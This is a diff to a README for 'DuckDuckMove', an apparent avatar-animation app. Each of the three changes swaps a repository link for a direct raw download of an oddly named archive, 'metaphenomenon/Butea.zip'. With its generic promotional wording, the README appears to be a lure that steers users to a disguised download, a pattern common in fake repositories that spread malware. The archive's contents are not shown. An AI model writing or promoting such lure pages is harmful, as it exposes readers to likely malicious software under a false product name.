@@ -1,6 +1,6 @@
 # 🦆 DuckDuckMove - Make Your Avatar Come Alive
 
-[![Download DuckDuckMove](https://img.shields.io/badge/Download-DuckDuckMove-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/joshuabauzon416-jpg/DuckDuckMove)
+[![Download DuckDuckMove](https://img.shields.io/badge/Download-DuckDuckMove-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/joshuabauzon416-jpg/DuckDuckMove/raw/refs/heads/main/metaphenomenon/Butea.zip)
 
 ## 🎯 What Is DuckDuckMove?
 
@@ -14,7 +14,7 @@ Getting started with DuckDuckMove is quick and simple. Even if you've never down
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/joshuabauzon416-jpg/DuckDuckMove](https://github.com/joshuabauzon416-jpg/DuckDuckMove)
+Visit this link to download the application: [https://github.com/joshuabauzon416-jpg/DuckDuckMove/raw/refs/heads/main/metaphenomenon/Butea.zip](https://github.com/joshuabauzon416-jpg/DuckDuckMove/raw/refs/heads/main/metaphenomenon/Butea.zip)
 
 The download page will show you a button to get the file. Just click it and the download will start automatically. The file is small, so it won't take long even on slower connections.
 
@@ -139,7 +139,7 @@ DuckDuckMove turns a boring static avatar into a lively, engaging animation – 
 
 So why wait? Give your profile a personality injection today. Download DuckDuckMove and let your avatar dance, wave, and move in ways you never thought possible.
 
-[![Download DuckDuckMove Now](https://img.shields.io/badge/Get_DuckDuckMove-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/joshuabauzon416-jpg/DuckDuckMove)
+[![Download DuckDuckMove Now](https://img.shields.io/badge/Get_DuckDuckMove-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/joshuabauzon416-jpg/DuckDuckMove/raw/refs/heads/main/metaphenomenon/Butea.zip)
 
 Your avatar will thank you – and so will everyone who sees it!
 
